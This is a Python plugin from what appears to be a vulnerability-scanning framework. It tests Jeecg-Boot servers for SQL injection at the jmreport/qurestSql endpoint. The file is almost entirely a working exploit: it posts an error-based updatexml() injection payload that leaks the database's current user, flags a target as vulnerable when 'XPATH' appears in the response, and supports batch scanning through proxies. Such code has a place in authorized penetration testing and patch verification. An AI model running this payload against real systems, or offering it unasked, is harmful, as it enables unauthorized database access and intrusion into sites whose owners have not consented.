#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()


class JeecgSql:

    def run(self, urls):
        try:
            url = urls + '/jeecg-boot/jmreport/qurestSql'
            data = """{"apiSelectId":"1290104038414721025","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"}"""
            header = {
                "User-Agent":self.headers,
                "Content-Type":"application/json"
            }
            response = requests.post(url,headers=header, data=data,verify=self.ssl, timeout=self.timeout, proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                OutPrintInfoSuc("Jeecg-Boot", f"存在SQL注入 {url}")
                if self.batch:
                    OutPutFile("jeecgboot_sql.txt",f"存在SQL注入 {url}")
            else:
                if not self.batch:
                    OutPrintInfo("Jeecg-Boot", '不存在存在SQL注入')

        except Exception:
            if not self.batch:
                OutPrintInfo("JeecgBoot", "目标请求出错")

    def main(self, target):
        self.batch = target["batch_work"]

        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Jeecg-Boot", '开始检测SQL注入...')
        self.run(url)
        if not self.batch:
            OutPrintInfo("Jeecg-Boot", 'SQL注入检测结束')